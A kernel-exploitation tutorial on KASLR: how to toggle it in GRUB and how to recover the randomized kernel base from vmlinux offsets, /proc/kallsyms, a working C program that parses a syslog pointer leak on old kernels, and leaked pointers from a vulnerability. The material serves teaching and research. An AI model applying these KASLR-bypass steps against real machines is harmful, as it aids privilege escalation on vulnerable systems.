01. KASLR (Kernel Address Space Layout Randomization)

  • Kernel Address Space Layout Randomization (KASLR) randomizes the base address of the kernel image in memory at boot time to make exploitation more difficult.
    • Because kernel exploitation often relies on knowing fixed addresses of kernel functions, structures, or gadgets, address randomization prevents hardcoded address attacks.
    • To exploit a kernel when KASLR is enabled, an attacker must first locate or leak the randomized base address of the kernel.

Disabling KASLR​

  • To disable KASLR:
    • Add nokaslr to GRUB_CMDLINE_LINUX_DEFAULT in /etc/default/grub.
Add 'nokaslr' to GRUB_CMDLINE_LINUX_DEFAULT
# If you change this file, run 'update-grub' afterwards to update
# /boot/grub/grub.cfg.
# For full documentation of the options in this file, see:
#   info -f grub -n 'Simple configuration'

GRUB_DEFAULT=0
GRUB_TIMEOUT_STYLE=hidden
GRUB_TIMEOUT=0
GRUB_DISTRIBUTOR=`lsb_release -i -s 2> /dev/null || echo Debian`
GRUB_CMDLINE_LINUX_DEFAULT="quiet nokaslr"
GRUB_CMDLINE_LINUX="find_preseed=/preseed.cfg auto noprompt priority=critical locale=en_US"
...
  • Apply configuration changes:

Enabling KASLR​

  • To enable KASLR:
    • Replace nokaslr with kaslr in GRUB_CMDLINE_LINUX_DEFAULT.
Add 'kaslr' to GRUB_CMDLINE_LINUX_DEFAULT
GRUB_CMDLINE_LINUX_DEFAULT="quiet kaslr"
Ubuntu 14.04
  • KASLR is available starting in Ubuntu 14.10 but may not be enabled by default.
  • Specify kaslr on the kernel command line.
  • Note: Enabling KASLR disables hibernation.
  • https://wiki.ubuntu.com/Security/Features
  • Run sudo update-grub and reboot.
  • With KASLR enabled, symbol addresses randomize on each boot (e.g. 0xffffffff840a2890, then 0xffffffff9f0a2890).
Address of prepare_kernel_cred after reboots with KASLR
lazenca0x0@ubuntu:~$ sudo reboot
lazenca0x0@ubuntu:~$ sudo cat /proc/kallsyms |grep prepare_kernel_cred
ffffffff840a2890 T prepare_kernel_cred
...
lazenca0x0@ubuntu:~$ sudo reboot
lazenca0x0@ubuntu:~$ sudo cat /proc/kallsyms |grep prepare_kernel_cred
ffffffff9f0a2890 T prepare_kernel_cred
...

How to find kernel memory addresses​

Using the vmlinux file​

  • In environments without KASLR, kernel symbol addresses can be resolved directly from vmlinux using readelf.
  • When KASLR is active, absolute addresses in vmlinux are no longer directly usable, but relative offsets from the .text base remain constant.
Get Kernel function address
lazenca0x0@ubuntu:~$ readelf -s /usr/lib/debug/boot/vmlinux-4.4.0-31-generic |grep prepare_kernel_cred 
 92759: 00000000f1f7ede6     0 NOTYPE  GLOBAL DEFAULT  ABS __crc_prepare_kernel_cred
 97668: ffffffff810a2890    86 FUNC    GLOBAL DEFAULT    1 prepare_kernel_cred
lazenca0x0@ubuntu:~$
  • Determine the .text section base address (0xffffffff81000000):
Get .text section address
lazenca0x0@ubuntu:~$ readelf -S /usr/lib/debug/boot/vmlinux-4.4.0-31-generic
...
  [ 1] .text             PROGBITS         ffffffff81000000  00200000
...
  • Calculate function offset: 0xffffffff810a2890 - 0xffffffff81000000 = 0xa2890
Get offset of prepare_kernel_cred function.
gdb-peda$ p 0xffffffff810a2890 - 0xffffffff81000000
$1 = 0xa2890
gdb-peda$

Using the "/proc/kallsyms" file​

  • When kernel.kptr_restrict = 1, unprivileged users see zeroes in /proc/kallsyms.
  • When kernel.kptr_restrict = 0, any user can read full symbol addresses from /proc/kallsyms even if KASLR is enabled.
Cannot access /proc/kallsyms with kernel.kptr_restrict = 1
lazenca0x0@ubuntu:~$ sysctl kernel.kptr_restrict
kernel.kptr_restrict = 1
lazenca0x0@ubuntu:~$ cat /proc/kallsyms |grep prepare_kernel_cred
0000000000000000 T prepare_kernel_cred
Get /proc/kallsyms with kernel.kptr_restrict = 0
lazenca0x0@ubuntu:~$ sudo sysctl -w kernel.kptr_restrict=0
kernel.kptr_restrict = 0
lazenca0x0@ubuntu:~$ cat /proc/kallsyms |grep prepare_kernel_cred
ffffffff8b0a2890 T prepare_kernel_cred

Kernel address leak using Syslog​

  • On older kernels (e.g. Ubuntu trusty 4.4.0-* and xenial 4.8.0-*), dmesg / syslog logs free memory regions upon boot containing unmasked kernel pointers:
    • Freeing unused kernel memory: 1480K (ffffffff90f42000 - ffffffff910b4000)
Get Kernel address from Syslog
lazenca0x0@ubuntu:~/Exploit$ dmesg |grep "Freeing unused"
[    1.075925] Freeing unused kernel memory: 1480K (ffffffffa9f42000 - ffffffffaa0b4000)
[    1.076181] Freeing unused kernel memory: 1836K (ffff880029835000 - ffff880029a00000)
[    1.076435] Freeing unused kernel memory: 156K (ffff880029dd9000 - ffff880029e00000)
  • Calculate the fixed offset from the leaked address to kernel base:
    • 0xffffffffaa0b4000 - 0xffffffffa9000000 = 0x10b4000
    • Therefore: kernel_base = leaked_address - 0x10b4000
Get Kernel address from Syslog - addr.c
#define _GNU_SOURCE
 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
 
#include <sys/klog.h>
#include <sys/mman.h>
 
#define SYSLOG_ACTION_READ_ALL 3
#define SYSLOG_ACTION_SIZE_BUFFER 10

void get_syslog(char **buffer, int *size){
 
    *size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);
    if(*size == -1){
        perror("Error");
    }
 
    int pagesize = getpagesize();
    *size = (*size / pagesize + 1) * pagesize;
    *buffer = (char*)mmap(NULL, *size, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 
    *size = klogctl(SYSLOG_ACTION_READ_ALL, &((*buffer)[0]), *size);
    if (*size == -1) {
        perror("Error");
    }
     
}
 
unsigned long get_kernel_addr (char *buffer, int size){
    const char *needle = "Freeing unused kernel memory";

    char* substr = (char*)memmem(&buffer[0], size, needle, strlen(needle));
    if (substr == NULL) {
        printf("%s not found\n", needle);
    }
     
    int start = 0;
    int end = 0;
    start = strchr(substr,'-') - substr;
    end = strrchr(substr,'\n') - substr;
  
    const char *needle2 = "ffffffff";
    substr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));
    if (substr == NULL) {
            fprintf(stderr, "[-] substring '%s' not found in syslog\n", needle2);
            exit(EXIT_FAILURE);
    }
  
    char *endptr = &substr[16];
    unsigned long addr = strtoul(&substr[0], &endptr, 16);
    addr -= 0x10b4000ul;
  
    return addr;
}
 
void main(){
    char *syslog;
    int size;
 
    get_syslog(&syslog, &size);
    unsigned long is_kernel_base_addr = get_kernel_addr(syslog, size);
    printf("The base addresss of the kernel is '0x%lx'\n", is_kernel_base_addr);
}
Get Kernel address from Syslog - Result
lazenca0x0@ubuntu:~/Exploit$ gcc -o addr addr.c
lazenca0x0@ubuntu:~/Exploit$ ./addr
The base addresss of the kernel is '0xffffffffa9000000'
lazenca0x0@ubuntu:~/Exploit$
  • In newer kernels (e.g. Linux 5.0+), kernel pointer leaks in boot logs have been cleaned up and restricted.
info
  • https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c

Kernel address leak using vulnerability​

  • Information disclosure or UAF vulnerabilities can leak kernel pointers to user space.
  • By computing the delta between the leaked pointer and the static symbol table offset, the attacker reconstructs the randomized kernel base and target function addresses dynamically.
Calculate offset from /proc/kallsyms
lazenca0x0@ubuntu:~/Exploit/uaf$ sudo cat /proc/kallsyms |grep prepare_kernel_cred
ffffffff870a2890 T prepare_kernel_cred
...
lazenca0x0@ubuntu:~/Exploit/uaf$ gdb -q
gdb-peda$ p 0xffffffff870a2890 - 0xa2890
$1 = 0xffffffff87000000
gdb-peda$ p 0xffffffff87a72cc0 - 0xffffffff87000000
$2 = 0xa72cc0
  • On next boot:
    • kernel_base = leaked_addr - 0xa72cc0
    • prepare_kernel_cred = kernel_base + 0xa2890
Find the base address of the kernel.
gdb-peda$ p 0xffffffffa9a72cc0 - 0xa72cc0
$1 = 0xffffffffa9000000
gdb-peda$ p 0xffffffffa9000000 + 0xa2890
$2 = 0xffffffffa90a2890
